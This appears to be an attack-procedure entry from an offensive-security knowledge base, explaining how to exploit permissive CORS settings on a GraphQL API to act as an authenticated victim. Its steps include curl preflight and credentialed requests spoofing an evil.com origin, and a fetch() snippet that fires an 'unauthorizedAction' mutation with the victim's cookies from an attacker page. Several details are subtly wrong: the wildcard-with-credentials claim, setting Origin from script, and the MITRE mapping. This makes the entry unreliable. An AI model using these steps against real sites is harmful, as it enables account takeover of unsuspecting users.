---
id: proc-998457-cors-leverage
tags:
  - cors
  - access-control
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/curl-cors-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:42.844Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Leverage-Permissive-CORS-for-Cross-Origin-Requests

## Summary

This procedure exploits overly permissive CORS configurations to enable cross-origin requests that include authentication credentials, allowing unauthorized actions from attacker-controlled origins on behalf of victims.

## Description

Permissive CORS rules, such as Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true, allow malicious sites to send requests to the target API with the victim's cookies. In the Enjin case, this facilitated CSRF attacks by bypassing origin checks. The attack requires a victim to visit an attacker site while authenticated. Outcomes include successful execution of API calls that would otherwise be blocked, leading to account takeover-like effects.

## Requirements

1. Target endpoint with wildcard or broad CORS origins
2. Victim's browser with active authentication session
3. Attacker domain to host the exploiting page
4. GraphQL or API endpoint that honors credentialed requests

## Defense

Defensive measures and detection strategies:

- Tighten CORS to specific trusted origins and disable credentials for wildcard
- Implement same-site cookies (Lax/Strict) to limit cross-site requests
- Log and alert on cross-origin requests from untrusted domains
- Use CORS preflight checks for non-simple requests

## Objectives

1. Bypass same-origin policy to include credentials in cross-origin requests
2. Execute API actions as the victim without origin validation
3. Chain with CSRF for full unauthorized access

## Instructions

### Step 1: Test CORS Configuration

**Context**: Verify permissive CORS by sending a cross-origin request and checking headers.

**Command** ([[commands/curl-cors-test]]):
```bash
curl -X OPTIONS "https://target.com/graphql" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -v
```

> Look for Access-Control-Allow-Origin: * or evil.com in response. Success: Preflight allows GET with credentials.

### Step 2: Send Credentialed Cross-Origin Request

**Context**: Execute a GET request from a different origin with cookies.

**Command** ([[commands/curl-cors-test]]):
```bash
curl -X GET "https://target.com/graphql?query={mutation{testAction}}" -H "Origin: https://evil.com" -H "Cookie: session=victim_session" -v
```

> Response should include CORS headers permitting the origin; data executes if authenticated.

### Step 3: Integrate into Malicious Page

**Context**: Use JavaScript to trigger from attacker's site.

```javascript
fetch('https://target.com/graphql?query={mutation{unauthorizedAction}}', {method: 'GET', credentials: 'include', headers: {'Origin': 'https://evil.com'}});
```

> Loads in victim's browser; CORS allows it. Confirm execution via API response or side effects.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-cors-test]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[cors]]
- [[access-control]]
- [[bypass]]
